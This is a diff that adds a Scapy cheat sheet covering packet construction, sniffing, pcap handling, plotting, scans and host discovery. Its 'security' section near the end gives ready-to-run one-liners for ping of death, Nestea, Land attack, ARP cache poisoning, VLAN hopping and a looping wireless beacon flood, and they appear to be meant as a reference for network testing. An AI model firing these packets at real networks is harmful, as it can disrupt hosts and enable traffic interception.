@@ -1,0 +1,425 @@
+* scapy
+** Scapy configuration
+
+Configure scapy to allow graphic:
+
+ apt-get install graphviz imagemagick
+
+Install scapy and configure
+
+ apt-get install scapy
+
+Allow graphical dumps for scapy:
+
+ apt-get install python-pyx
+ apt-get install python-gnuplot pyxplot
+
+Allow scapy to use crypto:
+
+ apt-get install python-pycryptop python-crypto
+
+Install vpython:
+
+ apt-get install python-visual
+
+** Basic usage: list commands and protocols
+
+List of commands:
+
+ lsc()
+
+List of protocols:
+
+ ls()
+
+To start creating different kind of packets/frames:
+
+ x=Ether()
+ x=IP()
+ x=TCP()
+ x=UDP()
+ x=ICMP()
+ x=Dot1Q()
+ ...etc...
+
+** set and print fields
+
+Parameters for different packets:
+
+ ls(IP)
+ ls(TCP)
+ ls(UDP)
+ ls(ICMP)
+ ls(Dot1Q)
+ ...etc..
+
+Show field:
+
+ x.field
+
+Set specific field:
+
+ x.field='value'
+
+Set specific field when creating a packet:
+
+ x=IP(field='value')
+
+Unset specific field:
+
+ del(x.field)
+
+=== Stack layers ===
+
+Stacking layers:
+
+ x=Ether()/IP()/TCP()
+
+Stacking layers with set values:
+
+ IP()/TCP()/"GET / HTTP/1.0\r\n\r\n"
+
+=== Export and dump packets ===
+
+Assembly a packet:
+
+ str(IP())
+
+Dissect a packet:
+
+ IP(_)
+
+Export to base64 format:
+
+ export_object(x)
+
+Import back to original format:
+
+ import_object(x)
+
+Hexdump a packet and convert to stream:
+
+ x=Ether()/IP(dst="www.slashdot.org")/TCP()/"GET /index.html HTTP/1.0 \n\n"
+ hexdump(x)
+ y=str(x)
+ z=Ether(y)
+ z
+
+Hide defaults (for a dissected package):
+
+ z.hide_defaults()
+ z
+
+** specify anges
+
+Specify a list of ports, IPs, etc:
+
+    x.dport=[135,139,445]
+
+Specify a range of ports:
+
+    x.dport=(110,120)
+
+Specify a list of ranges:
+
+    x.type=[(0,7),(9,12)]
+
+** sniffing, read and write pcaps
+
+Read PCAP files:
+
+ x=rdpcap("file.cap")
+ x
+
+Write PCAP files:
+
+ wrpcap("file.cap", x)
+
+Show in wireshark:
+
+  wireshark(x)
+
+Sniff packets:
+
+ x=sniff()
+ ...or for some interface and count...
+ x=sniff(iface="eth0",count=100)
+ ...or for some protocol and some host and count...
+ x=sniff(filter="icmp and host 66.35.250.151", count=2)
+
+** lists
+
+Working with list of packets:
+
+ x.summary()
+ x.nsummary()
+ x[index]
+
+** show and display packets
+
+Graphical dump to ps or pdf:
+
+ x.pdfdump(layer_shift=1)
+ ...or...
+ x.psdump("file.eps",layer_shift=1)
+
+Show a packet:
+
+ x.show()
+ ...or with checksum calculated with...
+ x.show2()
+
+Command to generate some specific packet:
+
+ x.command()
+
+Display conversations:
+
+ x.conversations()
+
+RAW hexdump:
+
+ x.hexraw()
+
+Hexdamp with/without padding
+
+ x.padding()
+ ...or...
+ x.nzpadding()
+
+Plot a lambda function to a list of packets:
+
+ x.plot()
+
+Make a table according to lambda function:
+
+ x.make_table()
+
+Draw graphs:
+
+ ... make the graph (e.g. from a traceroute ans results ...
+ ans.graph()
+ ... pipe to a ps ...
+ ans.graph(type="ps",target="| lp")
+ ... save to an svg file ...
+ ans.graph(target="> file.svg")
+
+3D graphs (if VPython installed):
+
+ ans.trace3D()
+
+=== send and receive ===
+
+Send packets or frames:
+
+ # Send will handle route and L2 for us
+ x=IP(dst="1.2.3.4")/ICMP()
+ send(x)
+ ...or...
+ # We will need to handle the proper interface and link layer protocol
+ x=(Ether()/IP(dst="1.2.3.4",ttl=(1,4)), iface="eth1")
+ sendp(x)
+
+** Loops
+
+Generate any value with random stuff except the checksums for fuzz tests:
+
+ send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
+
+Send and receive packets (will return 2 lists of packets, with ans and unans):
+
+ ...send and return only the first answer...
+ x=sr1(IP(dst="www.slashdot.org")/ICMP()/"XXXXXXXXXXX")
+ ...or just normal send and receive...
+ x=sr(IP(dst="192.168.8.1")/TCP(dport=[21,22,23]))
+ ...or with retry, timeout and interval...
+ sr(IP(dst="172.20.29.5/30")/TCP(dport=[21,22,23]),inter=0.5,retry=-2,timeout=1)
+ ...or with some loop...
+ srloop...
+
+ ...and same for L2...
+
+ srp1...
+ ... or...
+ srp...
+ ... or...
+ srploop
+
+Get the last result in a list (or two lists):
+
+ ans,unans = _
+
+** configurations
+
+Show current configuration:
+
+ conf
+
+Configure interface to use:
+
+ conf.iface='eth1'
+
+Configure super sockets:
+
+ conf.L3socket=L3dnetSocket
+ conf.L3listen=L3pcapListenSocket
+
+Configure a route:
+
+ ... to print routing table ...
+ conf.route
+ ... to delete a route ...
+ conf.route.delt(net="0.0.0.0/0",gw="192.168.8.1")
+ ... to add a route ...
+ conf.route.add(net="0.0.0.0/0",gw="192.168.8.254")
+ ... resync the routes ...
+ conf.route.resync()
+
+** modules
+
+Load modules:
+
+ ...for passive os fingerprint...
+ load_module("p0f")
+ p0f(x)
+
+** traceroute
+
+Traceroute with scapy:
+
+ traceroute(["www.yahoo.com","www.altavista.com","www.wisenut.com","www.copernic.com"],maxttl=20)
+
+** sessions
+
+Sessions with scapy:
+
+ ... to save ...
+ save_session()
+ ... to load ...
+ load_session()
+ ... show session ..
+ dir()
+
+** scans
+
+ACK scans:
+
+ ... classic tcp syn scan ...
+ ans,unans = sr(IP(dst="www.slashdot.org")/TCP(dport=[80,666],flags="A"))
+ ... find unfiltered ports (answered packets) ...
+ >>> for s,r in ans:
+ ...     if s[TCP].dport == r[TCP].sport:
+ ...        print str(s[TCP].dport) + " is unfiltered"
+ ... find filtered ports (unanswered packets)...
+ >>> for s in unans:
+ ...     print str(s[TCP].dport) + " is filtered"
+
+XMAS scans:
+
+ ... Checking RST responses will reveal closed ports on the target ...
+ ans,unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )
+
+IP scan (low level):
+
+ ... to ennumerate supported protocols ...
+ ans,unans=sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)
+
+ARP ping:
+
+ ...way to discover hosts on a local ethernet network...
+ ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
+ ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
+ ...or...
+ arping("192.168.1.*")
+
+ICMP ping:
+
+ ans,unans=sr(IP(dst="192.168.1.1-254")/ICMP())
+ ans.summary(lambda (s,r): r.sprintf("%IP.src% is alive") )
+
+TCP ping:
+
+ ...if echo requests are blocked :-)...
+ ans,unans=sr( IP(dst="192.168.1.*")/TCP(dport=80,flags="S") )
+ ...any response to our probes will indicate a live host :-)...
+ ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
+
+UDP ping:
+
+ ...if everything else fails, UDP ping will produce ICMP Port unreachable errors from live hosts :-)...
+ ans,unans=sr( IP(dst="192.168.*.1-10")/UDP(dport=0) )
+ ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
+
+** wireless injection
+
+Frame injection (wireless):
+
+ ... prepare the interface ...
+ $ ifconfig wlan0 up
+ $ iwpriv wlan0 hostapd 1
+ $ ifconfig wlan0ap up
+ ... inject a frame ...
+ sendp(Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/
+          Dot11Beacon(cap="ESS")/
+          Dot11Elt(ID="SSID",info=RandString(RandNum(1,50)))/
+          Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/
+          Dot11Elt(ID="DSset",info="\x03")/
+          Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"),iface="wlan0ap",loop=1)
+
+** security
+
+Malformed packets:
+
+ send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
+
+Ping of the death:
+
+ send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
+
+Nestea:
+
+ send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
+ send(IP(dst=target, id=42, frag=48)/("X"*116))
+ send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
+
+Land attack (win):
+
+ send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
+
+ARP cache poisoning:
+
+ send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 )
+
+ARP cache poisoning with double encapsulation:
+
+ send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )
+
+TCP port scanning:
+
+ res,unans = sr( IP(dst="target")/TCP(flags="S", dport=(1,1024)) )
+ res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
+
+IKE scanning (to identify VPN concentrators):
+
+ res,unans = sr( IP(dst="192.168.1.*")/UDP()/ISAKMP(init_cookie=RandString(8), exch_type="identity prot.")/ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()))
+ res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) )
+
+VLAN hopping:
+
+ sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())
+
+Analyze ISN (Initial Seq Number):
+
+ ans,unans=srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
+ >>> temp = 0
+ >>> for s,r in ans:
+ ...    temp = r[TCP].seq - temp
+ ...    print str(r[TCP].seq) + "\t+" + str(temp)
+ ...
+
+** More advanced features
+
+# Check advanced use: http://www.secdev.org/projects/scapy/doc/advanced_usage.html
+# Check adding new tools: http://www.secdev.org/projects/scapy/doc/extending.html
+# Check adding new protocols: http://www.secdev.org/projects/scapy/doc/build_dissect.html
+# Check scapy development: http://www.secdev.org/projects/scapy/doc/development.html
